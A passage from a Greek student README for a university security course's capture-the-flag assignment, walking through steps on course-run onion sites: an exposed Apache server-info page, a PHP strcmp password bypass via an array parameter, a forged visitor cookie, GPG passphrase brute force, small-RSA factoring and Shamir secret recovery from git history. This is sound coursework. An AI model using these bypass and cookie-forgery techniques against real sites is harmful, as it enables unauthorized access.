## 2022 Project 2

![](imgs/logo.png)

Ερωτήσεις:

1. Πού βρίσκεται ο Γιώργος;
1. Τι βρήκε ο Γιώργος;
1. Τι ώρα είναι στο "Plan X";
1. Πού βρίσκονται τα αρχεία του "Plan X";
1. Ποια είναι τα results του "Plan Y";
1. Ποιο είναι το code του "Plan Z";




#### Παρατηρήσεις

- Οι ίδιες ομάδες με την εργασία 1
- Εγγραφή στο github: https://classroom.github.com/a/HTr3OtgA

- Στο τελος του καθε βηματος θα βρισκεται ενα flag με prefix "FLAG={". Για παραδειγμα "**FLAG={ThisIsAFlag}**".
  **Αν το flag δεν εχει το παραπανω format, δεν εχετε τελειωσει ακομα το βημα** (μην στέλνετε claims χωρίς το flag).
- Μόλις ολοκληρώσετε κάθε βήμα στέλνετε claim στο ys13@chatzi.org


- Για τα βήματα 4-6 απαιτείται να γράψετε ένα πρόγραμμα που να αυτοματοποιεί την εύρεση της λύσης.
  Μπορείτε να χρησιμοποιήσετε ό,τι γλώσσα προγραμματισμού θέλετε, αλλά θα πρέπει να μπορώ να το τρέξω
  σε Ubuntu 20.04 χρησιμοποιώντας software που είναι διαθέσιμο στο Ubuntu. Θα πρέπει επίσης
  να φτιάξετε ένα script `run.sh` που εκτελεί το πρόγραμμα με ό,τι παραμέτρους χρειάζονται.
- Επίσης γράφετε report στο README.md με τα βήματα που ακολουθήσατε, και το κάνετε commit μαζί με οποιοδήποτε κώδικα χρησιμοποιήσατε
- Βαθμολογία
    - Η δυσκολία αυξάνεται, ιδιαίτερα στα βήματα 4-6.
    - Για ό,τι δεν ολοκληρώσετε περιγράψτε (και υλοποιήστε στο πρόγραμμα) την πρόοδό σας και πώς θα μπορούσατε να συνεχίσετε.
    - Με τα πρώτα 3 βήματα παίρνετε 5 στο μάθημα (αν έχετε πάει καλά στην εργασία 1)
    - Με τα 4-6 φτάνετε μέχρι το 10 (δεν υπάρχει γραπτή εξέταση)
    - Για τους μεταπτυχιακούς τα 4-6 είναι προαιρετικά. ΔΕΝ αντικαθιστούν το project
     (αλλά μπορούν να λειτουργήσουν προσθετικά στο βαθμό της εργασίας 1)
- Timeline
    - Τις πρώτες 10 μέρες δεν υπάρχου hints.
    - 24/6: αρχίζουν τα hints για τα βήματα 1,2
    - ~~30/6~~ 5/7: deadline για τα βήματα 1,2
    - Για τα βήματα 4-6 δίνονται hints μόνο σε όσους ζητήσουν
    - 14/7: deadline για τα βήματα 4-6
- Οσοι απαντάνε γρήγορα έχουν bonus και μπαίνουν στο HoF

- __Οχι spoilers__
- __Οχι DoS__ ή brute force. Μπορείτε να χρησιμοποιείτε scripts, αλλά όποιος βαράει στα τυφλά μηδενίζεται
   (θέλουμε οι servers να είναι accessible από όλους). Αν δεν είστε σίγουροι αν κάτι επιτρέπεται, απλά ρωτήστε.

# Μέλη ομάδας

- Ιωάννης Καπετανγεώργης, 1115201800061 ([giannhskp](https://github.com/giannhskp))
- Δημήτριος Σιταράς, 1115201800178 ([sitaras](https://github.com/Sitaras))



# Γενικά Σχόλια

Όπως περιγράφεται και στα ζητούμενα της εργασίας έχουμε δημιουργήσει ένα script  που αυτοματοποιεί την εύρεση της λύσης για τα βήματα 4-6.

Πιο συγκεκριμένα, το script αυτό έχει όνομα ```run.sh``` και βρίσκεται στο main directory. Το script αυτό εκτελεί τα 3 python scripts τα οποία έχουμε υλοποιήσει για την επίλυση των ερωτημάτων 4-6.

Επίσης, έχουμε προσθέσει την δυνατότητα να εκτελούνται μόνο συγκεκριμένα ερωτήματα από το script, κυρίως λόγω της μεγάλης καθυστέρησης του script για την ερώτηση 4. Έτσι:
- Αν δεν δοθεί κανένα όρισμα στο script, τότε εκτελούνται και τα 3 ερωτήματα.
- Αν δοθεί έστω και ένα όρισμα τότε εκτελούνται μόνο τα ερωτήματα που προσδιορίζονται από τα ορίσματα.

Παραδείγματα εκτέλεσης:
- ```./run.sh``` : εκτελούνται και τα 3 ερωτήματα
- ```./run.sh 5``` : εκτελείται μόνο το ερώτημα 5
- ```./run.sh 5 6``` : εκτελούνται μόνο τα ερωτήματα 5 και 6
- ```./run.sh 4 5 6``` : εκτελούνται και τα 3 ερωτήματα

***Σημαντική παρατήρηση***: Στα python scripts των ερωτημάτων 4,5 και 6, πραγματοποιούνται curl requests μέσω του tor. Ωστόσο, για να μπορούν να εκτελεστούν υπάρχουν κάποιες προϋποθέσεις που πρέπει να είναι εγκατεστημένες στο μηχάνημα. Οδηγίες για την εγκατάσταση εξηγούνται αναλυτικά στην παράγραφο [Curl Requests στο Tor](https://github.com/chatziko-ys13/2022-project-2-angry-nerds#curl-requests-%CF%83%CF%84%CE%BF-tor) της Ερώτησης 5.

Τόσο η λειτουργία όσο και η διαδικασία που ακολουθήσαμε για την υλοποίηση όλων των scripts (και την επίλυση των ερωτημάτων) εξηγείται αναλυτικά στην συνέχεια, ξεχωριστά για κάθε ερώτημα.

   
 # Ερώτηση 1: Πoύ βρίσκεται ο Γιώργος;
Αρχικά, αντιγράψαμε το παρακάτω link που απεικονίζεται στην εικόνα της εκφώνησης στον tor browser.
    http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion/
Το οποίο μας οδήγησε σε ένα website για επισκευές κινητών. Ανοίγοντας λοιπόν τα dev tools (καθώς
το home page δεν αποκάλυπτε καποια πληροφορία) ανακαλύψαμε στον HTML κώδικα της σελίδας το εξής comment:
```
Pretty sure this is 100% secure since I followed this very closely for securing my web server:
            https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d
            Would be a major disaster if someone can pierce my onion security...
```
Έτσι, μεταβήκαμε στο αντίστοιxo link και διαβάζοντας την παράγραφο "**3.1) Disable server-info and server-status (Apache only)**
", δοκιμάσαμε στο αρχικό link του tor site να προσθέσουμε /server-info και /server-status (το οποίο είναι disabled)
επομένως μεταβήκαμε στο http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion/server-info. 
Αναζητώντας μέσα στο "χάος" για αρκετή ώρα ανακαλύψαμε στο section "**Module Name: core.c**" ένα νέο server name: flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad

![alt text](imgs/q1_1.jpg)

Συνεπώς, απλά μεταβήκαμε στο http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/ (YS13's personal site) όπου συναντήσαμε μια μορφή authentication .

Προκειμένουμε λοιπόν να μπορέσουμε να το "hackεψουμε" ανοίξαμε τα dev tools.
Παρατηρώντας στο source code οτι το αρχείο `access.php` κανει το authentication. Mε ενα γρήγορα googlαρισμα βρίκαμε ότι:
```
The only NORMAL way to view PHP source code sitting in some file is to use phps extension, instead of normal php extension. If you make the file extension . phps, decently configured server will output a color-formated source instead of generated html that one would expect.
```
Όπότε απλά μεταβήκαμε στο http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/access.phps, που μας φανέρωνε τον κώδικα για το authentication και τον εξής γρίφο:
```i set $desired to the 48th multiple of 7 that contains a 7 in its decimal representation```
τον οποίο λύσαμε τρέχοντας το πρόγραμμα [riddle.c](q1/riddle.c), βρίσκοντας τελικά τον αριθμό **1337**. 

Έπειτα, "διαβάζοντας" ξανά τον κώδικα στο access.phps είδαμε ότι χρειάζονται 7 ψηφία στο πεδίο του user, 
δηλαδή `user=0001337`.

Στην συνέχεια έπρεπε να κάνουμε bypass τον έλεγχο για τον κωδικό. Μεταξύ άλλων, διαβάσαμε την εξής ιστοσελίδα: https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016, στην οποία παρουσιάζεται ένα σχεδόν ίδιο παράδειγμα για το bypass της συνάρτησης strcmp (η οποία ελέγχει τον κωδικό).
Έτσι, δοκιμάσαμε το link http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/access.php?user=0001337&password[]=%22%22,
το οποίο μας οδήγησε σε μια σελίδα που απλά έγραφε :
`Hi! You can find my blog posts at directory: /blogposts7589109238! ".`

Αστραπιαία πήγαμε στο http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238 
όπου από εκεί, με λίγο ψάξιμο, μεταβαβήκαμε στο http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/post3.html 
και η τελευταία πρόταση της συγκεκριμένης σελίδας έλεγε ρητά:
`"i left the phone backup in the standard secret backup location in fixers that only the winner visitor #834472 will find..." `.

Συνειδητοποιώντας ότι κάτι παίζει με το "Visitor Number:204", το "the winner visitor #834472 will find" και το ότι και οι δύο (angry members) έχουμε το ίδιο cookie ```Visitor:"MjA0OmZjNTZkYmM2ZDQ2NTJiMzE1Yjg2YjcxYzhkNjg4YzFjY2RlYTljNWYxZmQwNzc2M2QyNjU5ZmRlMmUyZmM0OWE%3D" ```.

Ψάχνοντας το format είναι ώστε να το κάνουμε ενδεχομένως decode, βρήκαμε ότι ειναι base64, συνεπώς χρησιμοποιώντας ένα online εργαλέιο (https://www.base64encode.org/) κάναμε decode το cookie και πήραμε το ```204:fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a7```. 

Το 2ο μέρος μετα την : είναι το sha256(204), συνεπώς υπολογίσαμε αντίστοιχα το sha256(834472) (όλα τα decode και τα encode για το sha256 format γίνανε στο online εργαλείο https://emn178.github.io/online-tools/sha256.html), ```sha256(834472) = 27c3af7ef2bee1af527dbf8c05b3db6cca63589941b8d49572aa64b5cd8c5b97```. 

Τελικά κάναμε ```base64_encrypt(834472:27c3af7ef2bee1af527dbf8c05b3db6cca63589941b8d49572aa64b5cd8c5b97)``` και πήραμε το νέο cookie:
```ODM0NDcyOjI3YzNhZjdlZjJiZWUxYWY1MjdkYmY4YzA1YjNkYjZjY2E2MzU4OTk0MWI4ZDQ5NTcyYWE2NGI1Y2Q4YzViOTc```.

Με την χρήση του, η σελίδα άλλαξε εμφανίζοντας:

![alt text](imgs/q1_2.jpg)

Μεταβαίνοντας έτσι και εμείς στο directory που αναγραφόταν 
(το οποίο βρίσκεται στο link: http://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion/sekritbackup7547/), συναντήσαμε δυο κρυπτογραφημένα αρχεία με την χρήση του gpg (`firefox.log.gz.gpg` και `signal.log.gpg`). 

Ακολούθως, πρωτού καταφέρουμε να τα κάνουμε decrypt, διαβάσαμε το txt αρχείο notes, καταλαβαίνοντας πως ψάχνουμε να βρούμε μια ημερομηνία και ένα string (key = SHA256(<current date in RFC3339 format> + " " + <secret string>), το `notes.txt` μας παρέπεμψε, επίσης, να ψάξουμε (XXX ropsten 0xdcf1bfb1207e9b22c77de191570d46617fe4cdf4dbc195ade273485dddc16783) στο ropsten, συγκεκριμένα βρίσκοντας την εξής σελίδα:
https://ropsten.etherscan.io/tx/0xdcf1bfb1207e9b22c77de191570d46617fe4cdf4dbc195ade273485dddc16783
όπου στο "Input Data" section είναι κρυμμένη η λέξη "bigtent", υποθέσαμε ότι αποτελεί το secret string που ψάχνουμε.

Στη συνέχεια, μέσω του προγράμματος [key_generator.py](q1/key_generator.py) παράγαμε υποψήφια κλειδιά με όλες τις ημερομηνίες των ετών 2020, 2021 και 2022 (αποθηκεύοντάς τα σε ένα αρχείο txt), τα οποία τα κάναμε brute force στο [gpg_decrypt.py](q1/gpg_decrypt.py) ώστε να βρούμε το σωστό κλειδί: 
```
    SHA256("2021-01-04 bigtent")=a7a7bf50cb39f3d560e0450955d653c46299c323250989cc93c9a2b9e9d1724e
``` 
Στο [gpg_decrypt.py](q1/gpg_decrypt.py) δοκιμάζουμε όλα τα υποψήφια κλειδιά που υπάρχουν στο αρχειο .txt που παράγεται
μεχρις ώτου να βρούμε το σωστό, δηλαδή αυτό που θα κάνει decrypt το αρχείο `signal.log.gpg` (`gpg -d --passphrase '+encrypted_key+' --batch signal.log.gpg 2> /dev/null`).

Αποκρυπτογραφώντας έπειτα με αυτό το κλειδί και τα 2 αρχεία πέρνουμε:

-------------------------------------
- signal.log
-------------------------------------
```
22 Feb 15:18 - You:    Hey Maria :)
23 Mar 20:44 - You:    Maria? I need a favor.
24 Mar 13:32 - You:    Maria, I passed from your place the other day but you were not there. Please call me it's urgent.
24 Mar 13:34 - Maria:  ???
25 Mar 13:35 - You:    HEy Maria! I'm trying to make sense of the inbetweens. I think I'm part of some weird game other people are playing on me...
25 Mar 13:35 - You:    my flat got poisoned by those people and im now sleeping in the balcony.
25 Mar 13:35 - You:    the neighbors are looking at me when i sleep.
25 Mar 13:36 - You:    i saw a girl in the eleveator yesterday holding a plant with big branches. she started talking to me. i didnt naswer. i think.
25 Mar 13:36 - You:    my mobile phone is broken. its tracking me and sending details to those men. i need to send it for repair.
25 Mar 13:37 - You:    i think im not well. need to escape this city. they are looking at me. i dont git why...
25 Mar 13:37 - You:    please come and find me. you are the only person i can commit to: eafb2886b8732d638a3c44a8882d309ae11fa19d
25 Mar 13:38 - You:    hope to see you soon! thanks!>
25 Mar 17:12 - Maria:  ??? What are you talking about? I'm not Maria. I think you got the wrong number mate.
```
-------------------------------------
- firefox.log
-------------------------------------
```
https://en.wikipedia.org/wiki/The_Conversation
https://en.wikipedia.org/wiki/The_Conversation
https://en.wikipedia.org/wiki/The_Conversation
https://en.wikipedia.org/wiki/The_Conversation
...
```
-------------------------------------

Εκτελόντας για το αρχειο firefox.log την εντολή `grep -v "https://en.wikipedia.org/wiki/The_Conversation" firefox.log`
πηραμε το link: https://github.com/asn-d6/tor, το οποιο το συνδιάσαμε με την αναφορά σε ένα commit που γίνεται στο αρχείο 
signal.log, έτσι που τελικά σχηματίσαμε το link https://github.com/asn-d6/tor/commit/eafb2886b8732d638a3c44a8882d309ae11fa19d
όπου και μεταβήκαμε. Εκεί λοιπόν περιγράφεται το εξής πρόβλημα κρυπτογραφίας RSA:
```
/**
 * Hey Maria... So I went to the Rivest club again yesterday and met a guy who
 * sold me tickets that will take me out of this crazy city. I hope that in a
 * few days we will be together again. Find me at:
 *
 *     http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/y||x||y||x.txt
 *
 *          where || means concatenation
 *
 ******
 *
 * N = 127670779
 * e = 7
 *
 * E(x) = 32959265
 * E(y) = 47487400
 */
 ```
Έτσι, με το πρόγραμμα [find_p_q.py](q1/find_p_q.py) βρήκαμε τους πρώτους αριθμούς p και q (μας δίνεται το `N = 127670779`, στη συνέχεια με το πρόγραμμα [rsa_decrypt.py](q1/rsa_decrypt.py) κάναμε decode τα ciphertexts  (E(x) = 32959265 και E(y) = 47487400) και τελικά βρήκαμε: `x=133710` και `y=74198`.
Συγκεκριμένα, στο [rsa_decrypt.py](q1/rsa_decrypt.py) αφού βρήκαμε τους πρώτους αριθμούς p και q μέσω bruteforce (`p = 7963` και `q = 16033`) και μας δίνεται το `e=7`, σε πρώτη φάση υπολογίζουμε το φ (`φ = (p-1)*(q-1)`), μετά το N (αν και αποτελεί δεδομένο,`N = 127670779` ) και τέλος το d, δηλαδή το private key (`d=e^-1 mod phi`), που το χρησιμοποιούμε για να κάνουμε decrypt τα ciphertexts.
Εν κατακλείδι, το link που προέκυψε είναι το http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/7419813371074198133710.txt , όπου βρίσκεται το 1ο μας flag:

```
Hey M,

I just started my ascent to the Gilman's Point on the Kilimanjaro.

I will set my camp there and wait for you. Please bring some clean water because
the people in the village were trying to poison me so I didn't get any.

see you~~

FLAG={GilmansPointKilimanjaro}

btw i've been keeping an up-to-date mirror of my favorite kilimanjaro newspaper at /kilimanjarotimes4818.jpg
```

# Ερώτηση 2: Τι βρήκε ο Γιώργος;

Η τελευταία πρόταση από το προηγούμενο ερώτημα μας παραμπέμπει στο link:

http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/kilimanjarotimes4818.jpg,
η φωτογραφία που εμφανίζεται κάνει αναφορά στο αρχείο sss491020.tar.gz το οποιο καταβάσαμε γραφοντας στο URL του tor browser 
http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/sss491020.tar.gz

To κάναμε unzip και "εμφανίστηκε" ο φακέλος με όνομα sss ο οποίος περιείχε μέσα του έναν φάκελο .git.
Υποψιαζόμενοι ότι κάτι κρύβεται μέσο Git, ανοίξαμε τερματικό και γράψαμε πρώτα την εντολή `git log`, εμφανίζοντας μας τα παρακάτω commits:
```
commit 46085f24338dd614ccdc398d75b3bf5ea94ba1d2 (HEAD, tag: show, master)
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:51:41 2022 +0300

    just let me sleeeeeeep!!!

commit 3829aff2f9bb6f81f9eb8490f7e96aa515a5ddc8
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:29:58 2022 +0300

    i mean look here is some info
```
κάναμε το καθένα `git show` για να δούμε "τι κρύβει", αποκαλύπτονας το εξής python script:
```python
import random

DEGREE = 2
MODULUS = 0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001
SEED = # XXX censored

def evaluate_poly(poly, x):
    result = 0
    for i, coeff in enumerate(poly):
        result = coeff * (x**i)
    return result % MODULUS

secret = # XXX censored

secret_int = int.from_bytes(secret, byteorder="big")
assert secret_int < MODULUS

test = secret_int.to_bytes(30, byteorder="big")
assert test == secret

poly = [secret_int]
random.seed(SEED)
for i in range(DEGREE):
    coeff = random.randint(0, MODULUS)
    poly.append(coeff)

assert evaluate_poly(poly, 0) == secret_int

shares = []
shares.append(evaluate_poly(poly, 1))
shares.append(evaluate_poly(poly, 2))
shares.append(evaluate_poly(poly, 3))

print("shares: ", shares)
```
Έπειτα, από περιέργεια δοκιμάσαμε την εντολή
`git log --reflog`
πέρνοντας όλο το σύνολο τον commits που έχουν γίνει :

```
commit 43d2443af99f7d426faa83aff1610e1e21793746 (main)
Author: George Kadianakis <desnacked@riseup.net>
Date:   Sun May 22 17:45:26 2022 +0300

    need to sleeeeeppppppp

commit 2681f8a5a761e6272158a6810fc7946e86af23b2 (tag: tag)
Author: George Kadianakis <desnacked@riseup.net>
Date:   Sun May 22 17:44:51 2022 +0300

    neeed to sleeeeeeeeeeeppppppp

commit d0ca5731822bf87365f2b04c1aa061117eb45056
Author: George Kadianakis <desnacked@riseup.net>
Date:   Sun May 22 17:41:09 2022 +0300

    fixup! i mean look here is some info

commit cd50c3df192f644b7d964c4da2f3b0d2a2839134
Author: George Kadianakis <desnacked@riseup.net>
Date:   Sun May 22 17:41:09 2022 +0300

commit b28e16048868d44ae7a268c20b8614def9f6b3e0
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:29:58 2022 +0300

    i mean look here is some info

commit 6c6aed7de81a237d115c2aa269b2793797b3198a
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 19:06:46 2022 +0300

    neeed sleeeeeeeppppppppppp

commit 626518d6b6cf41bcbf3be3c422ee6cb788d424a9
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 19:06:39 2022 +0300

    fixup! i mean look here is some info

commit 9af1ffba91efa0f9615029d845295f50ab531c0d
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 19:06:39 2022 +0300

commit 2472d433a10692d660c98c8a8e3013ddbea5ac30
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:29:58 2022 +0300

    i mean look here is some info

commit bf0ed3fe1ffaa3d3b15e615742f06e6cb73723b8
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:57:33 2022 +0300

    just let me sleeeeppppppppppp pleaseeee!!!!

commit 03b4ec8f593b41c587284d96103efccabdf7b18b
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:56:39 2022 +0300

    just let me sleeppppp!!!

commit 46085f24338dd614ccdc398d75b3bf5ea94ba1d2 (HEAD, tag: show, master)
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:51:41 2022 +0300

    just let me sleeeeeeep!!!

commit 889f3aa5ae9d885c9bdab5765464d65a11596148
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:51:30 2022 +0300

    fixup! i mean look here is some info

commit 91d93b6499309c2a0cc6f11a857252537c682615
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:51:30 2022 +0300

commit 3829aff2f9bb6f81f9eb8490f7e96aa515a5ddc8
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:29:58 2022 +0300

    i mean look here is some info

commit afb5698492d451d1112e85cd3afd69a4d4cbaa45
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:51:07 2022 +0300

    fixup! i mean look here is some info

commit 52941968c1ea38f3dd82fe6c1fe45dd3192c6e25
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:51:07 2022 +0300

commit c8c71afa52e71dee9dc88e12266f0f2dea3f071c
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:29:58 2022 +0300

    i mean look here is some info

commit 6f116c4b8a3dfdeff5c41ffbecebc33f1d67db38
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:25:31 2022 +0300

    please just let me sleeeeeeeeeeeeep!!!!!

commit 37f7d4c48c5220e086d83357204f5686f9375b48
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:25:17 2022 +0300

    fixup! i mean look here is some info

commit 1a378d136682800ba75005bc69da40a36eed9ad6
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:25:17 2022 +0300

commit 11ae5957d090debbad39dcee4fdf1cf8a0e40fa3
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:29:58 2022 +0300

    i mean look here is some info

commit 129d74dff47deaac5597653606b742a5b2876102
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:22:49 2022 +0300

    yes

commit 7444d57df48201934c9313bd9996b59e182e9b98
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:17:31 2022 +0300

    haha

commit a1afc323f0e9bcddcb87bf10bb8627f4697f785e
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 18:16:10 2022 +0300

    trying some interpolation code

commit cc8cbc934f9184422cb6c1b48b91361497fe3e0f
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:33:29 2022 +0300

    fly added

commit 55e9cb209b23e9a023e81ad066637d2dca5cd76d
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:30:40 2022 +0300

    i mean look u dont need this

commit 58495665f3fb4bf4b9ecdb77f76bd1df85b41e3c
Author: George Kadianakis <desnacked@riseup.net>
Date:   Thu May 19 16:29:58 2022 +0300

    i mean look here is some info
```

έπειτα κάναμε σε κάθε ένα ξεχωριστά `git show` βρίσκοντας τελικά τα παρακάτω:
```python
import random

DEGREE = 2
MODULUS = 0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001
SEED = # XXX censored

def evaluate_poly(poly, x):
    result = 0
    for i, coeff in enumerate(poly):
        result += coeff * (x**i)
    return result % MODULUS

def inv(x):
    lm, hm = 1, 0
    low, high = x % MODULUS, MODULUS
    while low > 1:
        r = high // low
        nm, new = hm - lm * r, high - low * r
        lm, low, hm, high = nm, new, lm, low
    return lm % MODULUS

def div_polys(a, b):
    assert len(a) >= len(b)
    a = [x for x in a]
    o = []
    apos = len(a) - 1
    bpos = len(b) - 1
    diff = apos - bpos
    while diff >= 0:
        quot = a[apos] * inv(b[bpos]) % MODULUS
        o.insert(0, quot)
        for i in range(bpos, -1, -1):
            a[diff+i] -= b[i] * quot
        apos -= 1
        diff -= 1
    return [x % MODULUS for x in o]

def zpoly(xs):
    root = [1]
    for x in xs:
        root.insert(0, 0)
        for j in range(len(root)-1):
            root[j] -= root[j+1] * x
    return [x % MODULUS for x in root]

# Given p+1 y values and x values with no errors, recovers the original
# p+1 degree polynomial.
# Lagrange interpolation works roughly in the following way.
# 1. Suppose you have a set of points, eg. x = [1, 2, 3], y = [2, 5, 10]
# 2. For each x, generate a polynomial which equals its corresponding
#    y coordinate at that point and 0 at all other points provided.
# 3. Add these polynomials together.
def interpolate_polynomial(xs, ys):
    # Generate master numerator polynomial, eg. (x - x1) * (x - x2) * ... * (x - xn)
    root = zpoly(xs)
    assert len(root) == len(ys) + 1
    # print(root)
    # Generate per-value numerator polynomials, eg. for x=x2,
    # (x - x1) * (x - x3) * ... * (x - xn), by dividing the master
    # polynomial back by each x coordinate
    nums = [div_polys(root, [-x, 1]) for x in xs]
    # Generate denominators by evaluating numerator polys at each x
    denoms = [evaluate_poly(nums[i], xs[i]) for i in range(len(xs))]
    invdenoms = [inv(denom) for denom in denoms]
    # Generate output polynomial, which is the sum of the per-value numerator
    # polynomials rescaled to have the right y values
    b = [0 for y in ys]
    for i in range(len(xs)):
        yslice = ys[i] * invdenoms[i] % MODULUS
        for j in range(len(ys)):
            if nums[i][j] and ys[i]:
                b[j] += nums[i][j] * yslice
    return [x % MODULUS for x in b]


secret = # XXX censored

secret_int = int.from_bytes(secret, byteorder="big")
assert secret_int < MODULUS

test = secret_int.to_bytes(30, byteorder="big")
assert test == secret

poly = [secret_int]
random.seed(SEED)
for i in range(DEGREE):
    coeff = random.randint(0, MODULUS)
    poly.append(coeff)

assert evaluate_poly(poly, 0) == secret_int

shares = []
shares.append(evaluate_poly(poly, 1))
shares.append(evaluate_poly(poly, 2))
shares.append(evaluate_poly(poly, 3))

print("shares: ", shares)
```
Ουσιαστικά, βρήκαμε μια πιο ολοκληρωμένη έκδοση του αρχικού python script (το αρχικό δεν ειχε την interpolate_polynomial() ), την οποία μπορούσαμε να βρούμε και πολύ πιο απλά με την εντολή `git stash pop` όπου τότε εμφανιζόταν στον φάκελο ένα αρχείο με όνομα polywork.py:
```
$ git stash pop
On branch main
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

    new file:   polywork.py

Dropped refs/stash@{0} (315aaf88dfd264d5eba6da711f0c33bb37f4a242)
```

Επίσης, βρήκαμε και 3 σχετικά παρόμοια κειμενάκια, ένα από αυτά είναι :

```
i mean like look this is too much... i just couldnt leave such private info in the internet...

i encrypted the name of the local into three shares and gave one to you Maria, the other to Shamir and the third to that weird guy from that nightclub...
get the shares and come and find me!

i wrote code to do the wolynomials and now it's ok...

maybe i can finally sleeeeeeeeeeeeep
```

Με λίγο googlaρισμα βρήκαμε οτι το παραπάνω python πρόγραμμα υλοποιεί τον αλγόριθμο κρυπτογραφίας Shamir's Secret Sharing, επομένως για να καταφέρουμε να σχηματίσουμε ξανά το `secret` έπρεπε να βρούμε τα 3 shares. Αρχικά, δώσαμε βάση στα παραπλανητικά κειμενάκια νομίζοντας ότι κρύβουν κάποιο γρίφο για το που θα βρούμε τα shares, ξοδεύοντας έτσι αρκετές ώρες χωρίς αποτέλεσμα και προσπαθώντας να βγάλουμε κάποια τρελή θεωρία που θα παρήγαγε τα shares, συνειδητοποιήσαμε πως τα κειμενάκια ήταν για να μας αποπροσανατολίσουν, και το πέτυχαν. Συνεπώς, συνεχίσαμε να ψάχνουμε στο Git, βλέποντας ξανά και ξανά όλα τα commits ένα-ένα χωρίς καμία ελπίδα. Στη συνέχεια, εξερευνόντας git εντολές που δεν έχουμε δοκιμάσει πέσαμε πάνω στη `git tag -n9` η οποία μας αποκάλυψε ότι υπάρχει ήδη ένα tag, έτσι γράψαμε `git tag show` φανερώνοντάς μας τα 3 shares:
```
show            just let me sleeeeeeep!!!
tag             shares:  [5007965719154398295316829646509289701874861709891808846734792385015541826201, 20129353592886270223448727591627806607524309415930743719526720763604786378070, 45364163628598845685938428155401936384627058279694842643445501229807995000756]
```
Χωρις να χάνουμε καθόλου χρόνο τρέξαμε το πρόγραμμα [decryption.py](q2/decryption.py), που ουσιαστικά είναι το πρόγραμμα που παρουσιάζεται σε ένα από τα commits, προσθέτοντας απλά τις παρακάτω γραμμές κώδικα:
```python
x_s = [1,2,3]
# found these shares at "git tag":
y_s = [5007965719154398295316829646509289701874861709891808846734792385015541826201, 20129353592886270223448727591627806607524309415930743719526720763604786378070, 45364163628598845685938428155401936384627058279694842643445501229807995000756]

print(int.to_bytes(interpolate_polynomial(x_s, y_s)[0], 30, byteorder="big"))
```
Αποκαλύπτοντάς μας το FLAG={TimeTravelPossible!!?}

# Ερώτηση 3: Τι ώρα είναι στο "Plan X";

Συνεχίζοντας την περιηγησή μας στο: http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/
οδηγηθήκαμε στο http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/diary2.html
όπου αναφέρεται ρητά το Plan X, συγκεκριμένα:
```
The secure Plan X server is up: xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion! I can finally sleep feeling safe... Please come by the store (when we open) and ask me for the password first.
```
Συνεπώς, πατώντας λοιπόν http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion εμφανιζόταν έναν pop-up, το οποίο ζητούσε username και password, έτσι επικεντρωθήκαμε στο να περάσουμε το authetication του server. Στο παραπάνω Link επίσης αναφέρεται ότι:
```
He said that it's even open source (github:chatziko/pico) and ultra secure. 
```
